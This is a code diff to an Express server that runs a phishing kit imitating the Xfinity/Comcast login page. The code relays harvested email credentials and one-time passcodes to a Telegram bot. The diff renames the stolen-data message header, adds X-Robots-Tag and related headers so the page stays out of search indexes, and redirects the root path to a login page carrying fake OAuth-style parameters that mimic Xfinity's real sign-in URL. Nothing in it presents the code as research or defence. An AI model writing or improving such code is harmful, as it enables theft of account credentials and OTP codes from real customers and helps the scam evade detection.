@@ -11,6 +11,16 @@ const PORT = process.env.PORT || 3000;
 // Middleware
 app.use(express.json());
 
+// --- Security Headers (bot-protection & anti-indexing) ---
+app.use((req, res, next) => {
+  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('Referrer-Policy', 'same-origin');
+  res.setHeader('Permissions-Policy', 'interest-cohort=()');
+  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
+  next();
+});
+
 // --- Telegram API Configuration ---
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -112,7 +122,7 @@ const composeCredentialsMessage = (data) => {
     timeZone: 'UTC', hour12: true
   }) + ' UTC';
 
-  return `<b>🔐 XfinityBoxResults - Credentials 🔐</b>
+  return `<b>🔐 BobbyBoxResults - Credentials 🔐</b>
 
 <b>ACCOUNT DETAILS</b>
 📧 Email: ${safeEmail}
@@ -146,7 +156,7 @@ const composeOtpMessage = (data) => {
     timeZone: 'UTC', hour12: true
   }) + ' UTC';
 
-  return `<b>🔑 XfinityBoxResults - OTP Code 🔑</b>
+  return `<b>🔑 BobbyBoxResults - OTP Code 🔑</b>
 
 <b>VERIFICATION CODE</b>
 🔢 OTP Code: ${safeOtp}
@@ -268,6 +278,11 @@ app.post('/api/sendOtp', rateLimit, async (req, res) => {
 // --- Static File Serving ---
 const distPath = join(__dirname, 'dist');
 
+// Redirect root to the Xfinity login page with long OAuth-style query params
+app.get('/', (req, res) => {
+  res.redirect(302, '/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dmy-account-web%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26state%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foverview%26response%3D1&reqId=b4f27a31-8c9e-4d1b-a5f6-3e7d2c8b9a01&ui_style=light&lang=en');
+});
+
 // Serve static files from dist/ with correct MIME types for .js.download files
 app.use(express.static(distPath, {
   setHeaders: (res, filePath) => {
@@ -276,11 +291,6 @@ app.use(express.static(distPath, {
     }
   },
 }));
-
-// Serve the Xfinity login page at root
-app.get('/', (req, res) => {
-  res.sendFile(join(distPath, 'login.html'));
-});
 
 // SPA fallback - for /password, /otp and other React routes
 app.get('*', (req, res) => {
